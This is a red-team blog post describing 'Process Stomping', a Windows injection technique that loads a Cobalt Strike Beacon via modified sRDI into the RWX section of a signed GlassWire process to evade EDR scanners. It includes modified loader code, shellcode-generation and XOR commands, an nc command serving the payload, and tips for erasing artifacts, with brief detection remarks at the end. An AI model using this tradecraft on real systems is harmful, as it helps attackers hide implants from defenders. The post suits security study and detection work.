# https://naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html

<!DOCTYPE html><!--
    So Simple Jekyll Theme 3.2.0
    Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
    Free for personal and commercial use under the MIT license
    https://github.com/mmistakes/so-simple-theme/blob/master/LICENSE
--><html lang="en-US" class="js fontawesome-i2svg-active fontawesome-i2svg-complete">



  

    

  


  <body class="layout--post  mockingjay-revisisted-process-stomping-and-loading-beacon-with-srdi">
    

    
  <div class="navigation-wrapper">
    <a href="https://naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html#menu-toggle" id="menu-toggle">Menu</a>
    
  </div><!-- /.navigation-wrapper -->


    <!-- /.masthead -->


    <main id="main" class="main-content" aria-label="Content">
  <article class="h-entry">
    

    <div class="page-wrapper">
      

      <div class="page-sidebar">
        <div class="page-author h-card p-author"><img src="https://naksyn.com/images/milky_way_150x150.jpg" class="author-avatar u-photo" alt="Naksyn"><div class="author-info"><div class="author-name">
        <span class="p-name">Naksyn</span>
      </div><ul class="author-links"><li class="author-link">
            <a class="u-url" rel="me" href="https://twitter.com/naksyn"><svg class="svg-inline--fa fa-twitter-square fa-w-14 fa-lg" title="Twitter" aria-labelledby="svg-inline--fa-title-1" data-prefix="fab" data-icon="twitter-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><title id="svg-inline--fa-title-1">Twitter</title><path fill="currentColor" d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-48.9 158.8c.2 2.8.2 5.7.2 8.5 0 86.7-66 186.6-186.6 186.6-37.2 0-71.7-10.8-100.7-29.4 5.3.6 10.4.8 15.8.8 30.7 0 58.9-10.4 81.4-28-28.8-.6-53-19.5-61.3-45.5 10.1 1.5 19.2 1.5 29.6-1.2-30-6.1-52.5-32.5-52.5-64.4v-.8c8.7 4.9 18.9 7.9 29.6 8.3a65.447 65.447 0 0 1-29.2-54.6c0-12.2 3.2-23.4 8.9-33.1 32.3 39.8 80.8 65.8 135.2 68.6-9.3-44.5 24-80.6 64-80.6 18.9 0 35.9 7.9 47.9 20.7 14.8-2.8 29-8.3 41.6-15.8-4.9 15.2-15.2 28-28.8 36.1 13.2-1.4 26-5.1 37.8-10.2-8.9 13.1-20.1 24.7-32.9 34z"></path></svg><!-- <i class="fab fa-twitter-square fa-lg" title="Twitter"></i> --></a>
          </li><li class="author-link">
            <a class="u-url" rel="me" href="https://github.com/naksyn"><svg class="svg-inline--fa fa-github-square fa-w-14 fa-lg" title="GitHub" aria-labelledby="svg-inline--fa-title-2" data-prefix="fab" data-icon="github-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><title id="svg-inline--fa-title-2">GitHub</title><path fill="currentColor" d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM277.3 415.7c-8.4 1.5-11.5-3.7-11.5-8 0-5.4.2-33 .2-55.3 0-15.6-5.2-25.5-11.3-30.7 37-4.1 76-9.2 76-73.1 0-18.2-6.5-27.3-17.1-39 1.7-4.3 7.4-22-1.7-45-13.9-4.3-45.7 17.9-45.7 17.9-13.2-3.7-27.5-5.6-41.6-5.6-14.1 0-28.4 1.9-41.6 5.6 0 0-31.8-22.2-45.7-17.9-9.1 22.9-3.5 40.6-1.7 45-10.6 11.7-15.6 20.8-15.6 39 0 63.6 37.3 69 74.3 73.1-4.8 4.3-9.1 11.7-10.6 22.3-9.5 4.3-33.8 11.7-48.3-13.9-9.1-15.8-25.5-17.1-25.5-17.1-16.2-.2-1.1 10.2-1.1 10.2 10.8 5 18.4 24.2 18.4 24.2 9.7 29.7 56.1 19.7 56.1 19.7 0 13.9.2 36.5.2 40.6 0 4.3-3 9.5-11.5 8-66-22.1-112.2-84.9-112.2-158.3 0-91.8 70.2-161.5 162-161.5S388 165.6 388 257.4c.1 73.4-44.7 136.3-110.7 158.3zm-98.1-61.1c-1.9.4-3.7-.4-3.9-1.7-.2-1.5 1.1-2.8 3-3.2 1.9-.2 3.7.6 3.9 1.9.3 1.3-1 2.6-3 3zm-9.5-.9c0 1.3-1.5 2.4-3.5 2.4-2.2.2-3.7-.9-3.7-2.4 0-1.3 1.5-2.4 3.5-2.4 1.9-.2 3.7.9 3.7 2.4zm-13.7-1.1c-.4 1.3-2.4 1.9-4.1 1.3-1.9-.4-3.2-1.9-2.8-3.2.4-1.3 2.4-1.9 4.1-1.5 2 .6 3.3 2.1 2.8 3.4zm-12.3-5.4c-.9 1.1-2.8.9-4.3-.6-1.5-1.3-1.9-3.2-.9-4.1.9-1.1 2.8-.9 4.3.6 1.3 1.3 1.8 3.3.9 4.1zm-9.1-9.1c-.9.6-2.6 0-3.7-1.5s-1.1-3.2 0-3.9c1.1-.9 2.8-.2 3.7 1.3 1.1 1.5 1.1 3.3 0 4.1zm-6.5-9.7c-.9.9-2.4.4-3.5-.6-1.1-1.3-1.3-2.8-.4-3.5.9-.9 2.4-.4 3.5.6 1.1 1.3 1.3 2.8.4 3.5zm-6.7-7.4c-.4.9-1.7 1.1-2.8.4-1.3-.6-1.9-1.7-1.5-2.6.4-.6 1.5-.9 2.8-.4 1.3.7 1.9 1.8 1.5 2.6z"></path></svg><!-- <i class="fab fa-github-square fa-lg" title="GitHub"></i> --></a>
          </li></ul>

<span class="read-time">9 min read</span>

    <time class="page-date dt-published" datetime="2023-11-18T00:00:00-05:00"><a class="u-url" href="https://naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html">November 18, 2023</a>
</time>

  </div>
</div>

        
  <h3 class="page-taxonomies-title">Categories</h3>
  
  <ul class="page-taxonomies"><li class="page-taxonomy"><a class="p-category" href="https://naksyn.com/categories/#edr-evasion" title="Pages filed under EDR evasion">EDR evasion</a></li>
  </ul>


        
  <h3 class="page-taxonomies-title">Tags</h3>
  
  <ul class="page-taxonomies"><li class="page-taxonomy"><a href="https://naksyn.com/tags/#cobalt-strike" title="Pages tagged cobalt strike" rel="tag">cobalt strike</a></li><li class="page-taxonomy"><a href="https://naksyn.com/tags/#evasion" title="Pages tagged evasion" rel="tag">evasion</a></li><li class="page-taxonomy"><a href="https://naksyn.com/tags/#injection" title="Pages tagged injection" rel="tag">injection</a></li><li class="page-taxonomy"><a href="https://naksyn.com/tags/#process-stomping" title="Pages tagged process stomping" rel="tag">process stomping</a></li><li class="page-taxonomy"><a href="https://naksyn.com/tags/#redteam" title="Pages tagged redteam" rel="tag">redteam</a></li><li class="page-taxonomy"><a href="https://naksyn.com/tags/#srdi" title="Pages tagged sRDI" rel="tag">sRDI</a></li>
  </ul>


      </div>

      <div class="page-content">
        <div class="e-content">
          <p><img src="https://naksyn.com/images/monkeyjay.PNG" alt="image-center" title="Mojo Monkeyjay" class="align-center"></p>

<div id="entry-table-of-contents" class="toc-wrapper">
  <h2 id="toc-toggle" class="no_toc">
  Table of Contents <svg class="svg-inline--fa fa-chevron-down fa-w-14 toc-toggle-icon" aria-hidden="true" data-prefix="fas" data-icon="chevron-down" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"></path></svg><!-- <i class="toc-toggle-icon fas fa-chevron-down"></i> -->
</h2>
<ol id="markdown-toc">
  <li><a href="https://naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html#tldr" id="markdown-toc-tldr">TL;DR</a></li>
  <li><a href="https://naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html#credits" id="markdown-toc-credits">Credits</a></li>
  <li><a href="https://naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html#intro" id="markdown-toc-intro">Intro</a></li>
  <li><a href="https://naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html#process-stomping" id="markdown-toc-process-stomping">Process Stomping</a></li>
  <li><a href="https://naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html#using-srdi-to-load-a-beacon-on-an-rwx-process-section" id="markdown-toc-using-srdi-to-load-a-beacon-on-an-rwx-process-section">using sRDI to load a Beacon on an RWX process’ section</a></li>
  <li><a href="https://naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html#putting-it-all-together-srdi--reflective-loaderless-beacon--process-stomping" id="markdown-toc-putting-it-all-together-srdi--reflective-loaderless-beacon--process-stomping">Putting it all together: sRDI — Reflective-Loaderless Beacon — Process Stomping</a></li>
  <li><a href="https://naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html#outro" id="markdown-toc-outro">Outro</a></li>
</ol>

</div>

<h3 id="tldr">TL;DR</h3>

<p><a href="https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution">Original Mockingjay technique</a> abuses dll with RWX sections to obtain a stealthier way to inject malicious code, basically by avoiding the creation of dynamic memory allocation and avoiding the usage of virtualprotect, since RWX is already what we need.
The same reasoning can be applied also to executables with RWX sections because we can:</p>

<ol>
  <li>start the executable in a suspended state.</li>
  <li>write some shellcode on the RWX section.</li>
  <li>resume the thread on the desired entry point.</li>
</ol>

<p>This technique, dubbed Process Stomping, is a variation of hasherezade’s <a href="https://github.com/hasherezade/process_overwriting">Process Overwriting</a> and it has the advantage of writing a shellcode payload on a targeted section instead of writing a whole PE payload over the hosting process address space.</p>

<p>We fell in love with DoublePulsar in 2017 so we wanted to use sRDI with a Reflective-Loaderless payload as shellcode. 
For this reason we used the recent <a href="https://www.cobaltstrike.com/blog/cobalt-strike-49-take-me-to-your-loader">Cobalt Strike 4.9 feature</a> that allow the generation of a Beacon without a reflective loader and we modified the <a href="https://github.com/monoxgas/sRDI">sRDI</a> project to generate shellcode that will in turn bootstrap the reflective loading of Beacon <strong>on the RWX region of the stomped executable</strong>.</p>

<p>We tested the injection on a GlassWire executable (x86) that has a section called .themida with RWX permissions and as a final result we got the process running with an injected beacon living in the RWX memory range.
This was not a vulnerability on GlassWire side given the fact that every executable with RWX permissions and enough space to host a Beacon would be a good fit.</p>

<p>The technique’s PoC <a href="https://github.com/naksyn/ProcessStomping">can be found on my github</a> , along with the lightly adapted sRDI project used.</p>

<h3 id="credits">Credits</h3>

<p>A huge thank you to:</p>
<ul>
  <li>Aleksandra Doniec (@hasherezade) for <a href="https://github.com/hasherezade/process_overwriting">Process Overwriting</a></li>
  <li>Nick Landers for <a href="https://github.com/monoxgas/sRDI">sRDI</a></li>
</ul>

<h3 id="intro">Intro</h3>

<p>Poking around with Moneta I stumbled upon a strange behaviour held by <a href="https://www.glasswire.com/">GlassWire</a> that I often use because I find it very useful to spot anomalies and infections.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center"><img src="https://naksyn.com/images/glasswire_moneta.png" alt="image-center" title="GlassWire x86 executable" class="align-center"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center"><em>Moneta output for GlassWire executable</em></td>
    </tr>
  </tbody>
</table>

<p>As can be seen on the picture, GlassWire executable has a section named .themida, that immediately recalled the famous <a href="https://www.oreans.com/Themida.php">packer</a>.
The section has a size of around 7600 kB and RWX permissions.</p>

<p class="notice--info"><strong>The key element here is that Moneta is alerting “modified code” for the .themida section for the entirety of its size. This is intended behaviour for packers and alike, since packed binaries while on disk and packed, have totally different content when unpacked in memory.</strong></p>

<p>This would be a perfect spot to hide in, since Moneta will alert this exact same behaviour on every GlassWire binary.
Notably, there’s also a 64 kB RWX private commit and as a cherry on top, the executable is 32 bit and signed.
Double-checking with ProcessHacker and PEBear confirmed the finding.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center"><img src="https://naksyn.com/images/PH_glasswire.png" alt="image-center" title="ProcessHacker Memory view for GlassWire executable" class="align-center"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center"><em>ProcessHacker Memory view for GlassWire executable</em></td>
    </tr>
  </tbody>
</table>

<table>
  <thead>
    <tr>
      <th style="text-align: center"><img src="https://naksyn.com/images/pebear_glasswire.png" alt="image-center" title="PEbear section view for GlassWire executable" class="align-center"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center"><em>PEbear section view for GlassWire executable</em></td>
    </tr>
  </tbody>
</table>

<p>While looking at these interesting characteristics, <a href="https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution">Mockingjay</a> injection technique immediately came to mind. However, it originally aimed at writing malicious code onto a dll with RWX permissions, not onto a running process’ section.
So we decided to investigate if the same Mockingjay principle could be applied also to executables and we wanted to <strong>load a beacon onto the mapped RWX section itself</strong>, instead of allocating dynamic memory.
This post documents the journey to achieve the aforementioned outcome.</p>

<h3 id="process-stomping">Process Stomping</h3>

<p>One common way of writing malicious code onto a section’s process is to use some variations of Process Hollowing technique. 
As a refresher, Process Hollowing uses the following Windows APIs:</p>

<ol>
  <li><strong>CreateProcess</strong> - setting the Process Creation Flag to CREATE_SUSPENDED (0x00000004) in order to suspend the processes primary thread.</li>
  <li><strong>ZwUnmapViewOfSection or NtUnmapViewOfSection</strong> - used to unmap the process memory. These two APIs basically release all memory pointed to by a section.</li>
  <li><strong>VirtualAllocEx</strong> - used to allocate new memory for malicious code to be written.</li>
  <li><strong>WriteProcessMemory</strong> - used to write each malicious code to the target process space.</li>
  <li><strong>SetThreadContext</strong> - used to point the entrypoint to a new code section that it has written.</li>
  <li><strong>ResumeThread</strong> - self-explanatory.</li>
</ol>

<p>Process Hollowing has been pretty popular among malware authors for quite a while, in the meantime, some variations of this technique have been published.
One notable variation is called <a href="https://github.com/hasherezade/process_overwriting">Process Overwriting</a> and it avoids the step 2 and 3 by writing the malicious PE over the hosting process memory space (started in step 1).
This is how an implanted PE looks like in memory (the host process is calc.exe).</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center"><img src="https://naksyn.com/images/process_overwriting_hasherezade.png" alt="image-center" title="Process Overwriting" class="align-center"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center"><em>Proocess Overwriting injected PE - taken from hasherezade’s github repository</em></td>
    </tr>
  </tbody>
</table>

<p>This is nearly everything we need, except for the fact that we would need to write some shellcode over a specific section and not a PE over the whole hosting process address space right from the base address.</p>

<p>Quite similarly to the Module Stomping counterpart, our aim in Process Stomping is to write some shellcode onto a specific section of a target process that we started in a suspended state.
For the purpose of this blogpost, the section will be the one with RWX permissions (.themida in the GlassWire executable) so that we can exploit the generous permissions and the likelihood of being in a quite popular false positive situation for GlassWire.</p>

<p>These are the main steps of the ProcessStomping technique:</p>

<ol>
  <li><strong>CreateProcess</strong> - setting the Process Creation Flag to CREATE_SUSPENDED (0x00000004) in order to suspend the processes primary thread.</li>
  <li><strong>WriteProcessMemory</strong> - used to write each malicious shellcode to the target process section.</li>
  <li><strong>SetThreadContext</strong> - used to point the entrypoint to a new code section that it has written.</li>
  <li><strong>ResumeThread</strong> - self-explanatory.</li>
</ol>

<p>The main difference between the existing ProcessOverwriting technique and ProcessStomping is that the former writes the target process’ memory space starting from the top of it, with a PE, on the other hand, ProcessStomping is used to write shellcode only onto a specific section of the target process.
We can then add a bit more juice by asking ourself this question:</p>

<p class="notice--warning"><strong>It’s a waste of an opportunity to stomp on an executable with a native RWX section using some shellcode that will then dynamically allocate our payload. Why not let our payload live within the RWX section instead?</strong></p>

<h3 id="using-srdi-to-load-a-beacon-on-an-rwx-process-section">using sRDI to load a Beacon on an RWX process’ section</h3>

<p>In order to reach our objective and make our payload live into the RWX section of the target process that we want to stomp, we can combine the new <a href="https://www.cobaltstrike.com/blog/cobalt-strike-49-take-me-to-your-loader">Cobalt Strike 4.9 feature</a> of exporting Beacon without a Reflective Loader and using <a href="https://github.com/monoxgas/sRDI">sRDI</a> project as a prepended loader for Beacon.
For those unfamiliar with sRDI, it can essentially be seen as a tool that turns dlls into position independent shellcode also on the fly.</p>

<p>Executed sRDI shellcode will load the dll using Reflective Injection and it can provide some very useful addendums to the <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">original Stephen Fewer’s technique</a>, such as access to the shellcode location and argument passing.</p>

<p>Since sRDI is using VirtualAlloc to load the dll and VirtualProtect to finalize sections, we commented out the relevant codeblocks and set the base address for the subsequent dll loading as the written shellcode location (within .themida section) plus an applied offset.
In this way the dll will be loaded onto the section itself rather than on a dynamically allocated memory space and we will be maintaining a whole RWX section because Virtualprotect won’t be called after the dll’s sections are written.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="c1">// Commented VirtualAlloc codeblock</span>
	<span class="cm">/*baseAddress = (ULONG_PTR)pVirtualAlloc(
		(LPVOID)(ntHeaders-&gt;OptionalHeader.ImageBase),
		alignedImageSize,
		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
	);

	if (baseAddress == 0) {
		baseAddress = (ULONG_PTR)pVirtualAlloc(
			NULL,
			alignedImageSize,
			MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
		);
	}*/</span>
	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">500</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>  <span class="c1">// 500 kB chosen offset from shellcode location - adapt it to your needs</span>
	<span class="n">baseAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="n">pvShellcodeBase</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span>
	
	<span class="p">[...]</span>
	
	<span class="c1">// Commented VirtualProtect codeblock</span>
	<span class="cm">/*
	pVirtualProtect(
		(LPVOID)(baseAddress + sectionHeader-&gt;VirtualAddress),
		sectionHeader-&gt;SizeOfRawData,
		protect, &amp;protect
	);
	*/</span>
	
</code></pre></div></div>

<p>There’s one more thing to address, if we create a process in suspended state and then write something onto an RWX section, we’ll have PAGE_EXECUTE_WRITECOPY (WCX on ProcessHacker) permissions on the section’s areas that are not written, and this will leave a non-homogeneous RWX section.
As per microsoft documentation:</p>

<p class="notice--info"><strong>PAGE_EXECUTE_WRITECOPY enables execute, read-only, or copy-on-write access to a mapped view of a file mapping object. An attempt to write to a committed copy-on-write page results in a private copy of the page being made for the process. The private page is marked as PAGE_EXECUTE_READWRITE, and the change is written to the new page.</strong></p>

<p>This is how the .themida section looks like after the GlassWire process has been started in suspended state:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center"><img src="https://naksyn.com/images/wcx_glasswire.png" alt="image-center" title="PAGE_EXECUTE_WRITECOPY of .tehmida section" class="align-center"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center"><em>PAGE_EXECUTE_WRITECOPY of .themida section on process start</em></td>
    </tr>
  </tbody>
</table>

<p>If we directly write a shellcode and load a dll payload onto this section this is what we’ll get:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center"><img src="https://naksyn.com/images/wcx_shc_no_overwrite.png" alt="image-center" title="WCX and RWX cocktail" class="align-center"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center"><em>WCX and RWX Mojito cocktail</em></td>
    </tr>
  </tbody>
</table>

<p>So to avoid leaving WCX permissions around <strong>we can overwrite the whole section once with dummy data in order to get a clean and contiguous RWX section even after the shellcode gets written and the payload is loaded.</strong></p>

<p>For this very same reason of not leaving unnecessary artifacts, we’ll also overwrite the sRDI shellcode blob with dummy data but only after it has been executed and loaded our Beacon in the right RWX section.</p>

<p>The visual representation of what we would like to achieve is depicted in the following figure.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center"><img src="https://naksyn.com/images/procstomping.png" alt="image-center" title="Process Stomping using sRDI to load a payload on an executable's section" class="align-center"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center"><em>Process Stomping using sRDI to load a payload on an executable’s section</em></td>
    </tr>
  </tbody>
</table>

<h3 id="putting-it-all-together-srdi--reflective-loaderless-beacon--process-stomping">Putting it all together: sRDI — Reflective-Loaderless Beacon — Process Stomping</h3>

<p>After compiling the sRDI project with our modifications, some post build actions are performed and their aim is to extract the .text section of the built executable placing it under the bin folder. This is because sRDI code is written as PIC (Position Independent Code) so that it can be executed like shellcode.
The next step is to update the newly generated PIC into the sRDI tools used for loading or generating the final shellcode blob:</p>

<p><code class="language-plaintext highlighter-rouge">cd C:\Users\naksyn\sRDI\sRDI-master</code></p>

<p><code class="language-plaintext highlighter-rouge">python .\lib\Python\EncodeBlobs.py .\</code></p>

<p>We can now generate a Cobalt Strike Beacon dll without a reflective loader but be sure to generate an x86 payload and you can double check the output on the Script Console to make sure the Beacon dll has been generated correctly.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center"><img src="https://naksyn.com/images/script_console_output.png" alt="image-center" title="Beacon dll generated without Reflective Loader" class="align-center"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center"><em>Cobalt Strike Script Console output during the generation of a Beacon dll without Reflective Loader</em></td>
    </tr>
  </tbody>
</table>

<p>The payload dll can now be converted into shellcode. sRDI will prepend its bootstrap in the following <a href="https://www.netspi.com/blog/technical/adversary-simulation/srdi-shellcode-reflective-dll-injection/">way</a>:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center"><img src="https://naksyn.com/images/srdi.png" alt="image-center" title="sRDI shellcode blob" class="align-center"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center"><em>sRDI shellcode blob structure - image taken from: https://www.netspi.com/blog/technical/adversary-simulation/srdi-shellcode-reflective-dll-injection/</em></td>
    </tr>
  </tbody>
</table>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python ..\Python\ConvertToShellcode.py -b -f "changethedefault" .\noRLx86.dll

</code></pre></div></div>

<p>The shellcode blob can then be xored with a key-word and downloaded using a simple socket as implemented in the <a href="https://github.com/naksyn/ProcessStomping/">Process Stomping repo</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python xor.py noRLx86.bin noRLx86_enc.bin Bangarang

nc -vv -l -k -p 8000 -w 30 &lt; noRLx86_enc.bin
</code></pre></div></div>

<p>Here’s a video demonstration:</p>

<video width="100%" preload="auto" height="auto" max-width="100px" muted="" controls="">
    <source src="https://naksyn.com/videos/procstomping.mp4" type="video/mp4">
</video>

<p>After running Moneta against the injected process we get these results:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center"><img src="https://naksyn.com/images/glasswire_moneta_bangarang.png" alt="image-center" title="Moneta output against the injected process" class="align-center"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center"><em>Moneta output against the injected process</em></td>
    </tr>
  </tbody>
</table>

<p>We can see that the .themida section has RWX permissions for the whole size of it and that there’s a thread started from an offset because we resumed the main thread starting at the shellcode address.</p>

<h3 id="outro">Outro</h3>

<p>Executables with RWX sections can be abused similarly to dlls, but there are differences that may offer better detection opportunities.</p>

<p>In fact, Process Stomping technique requires starting the target process in a suspended state, changing the thread’s entry point, and then resuming the thread to execute the injected shellcode. These are operations that might be considered suspicious if performed in quick succession and could lead to increased scrutiny by some security solutions.</p>

<p>However, as of November 2023, exploiting RWX sections in executables is not a widely abused technique and may allow an attacker to blend in, potentially being dismissed as a false positive, without resorting to the well-known Mockingjay technique applied to DLLs.</p>

<p>By leveraging sRDI or other purposely built custom Reflective Loaders, malicious payloads can be written, loaded, and executed within the available RWX sections. This avoids the need for dynamic memory allocation during both the stages of shellcode and payload execution.</p>

        </div>

        
          <div class="page-share">
  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fedr%2520evasion%2F2023%2F11%2F18%2Fmockingjay-revisited-process-stomping-srdi-beacon.html" class="btn btn--facebook btn--small"><svg class="svg-inline--fa fa-facebook fa-w-14 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="facebook" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M448 56.7v398.5c0 13.7-11.1 24.7-24.7 24.7H309.1V306.5h58.2l8.7-67.6h-67v-43.2c0-19.6 5.4-32.9 33.5-32.9h35.8v-60.5c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9h-58.4v67.6h58.4V480H24.7C11.1 480 0 468.9 0 455.3V56.7C0 43.1 11.1 32 24.7 32h398.5c13.7 0 24.8 11.1 24.8 24.7z"></path></svg><!-- <i class="fab fa-fw fa-facebook" aria-hidden="true"></i> --> <span>Share</span></a>
  <a href="https://twitter.com/intent/tweet?text=Mockingjay+revisisted+-+Process+stomping+and+loading+beacon+with+sRDI%20http%3A%2F%2F0.0.0.0%3A4000%2Fedr%2520evasion%2F2023%2F11%2F18%2Fmockingjay-revisited-process-stomping-srdi-beacon.html" class="btn btn--twitter btn--small"><svg class="svg-inline--fa fa-twitter fa-w-16 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><!-- <i class="fab fa-fw fa-twitter" aria-hidden="true"></i> --> <span>Tweet</span></a>
  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3A%2F%2F0.0.0.0%3A4000%2Fedr%2520evasion%2F2023%2F11%2F18%2Fmockingjay-revisited-process-stomping-srdi-beacon.html" class="btn btn--linkedin btn--small"><svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg><!-- <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> --> <span>LinkedIn</span></a>
  <a href="https://reddit.com/submit?title=Mockingjay+revisisted+-+Process+stomping+and+loading+beacon+with+sRDI&amp;url=http%3A%2F%2F0.0.0.0%3A4000%2Fedr%2520evasion%2F2023%2F11%2F18%2Fmockingjay-revisited-process-stomping-srdi-beacon.html" class="btn btn--reddit btn--small"><svg class="svg-inline--fa fa-reddit fa-w-16 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="reddit" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 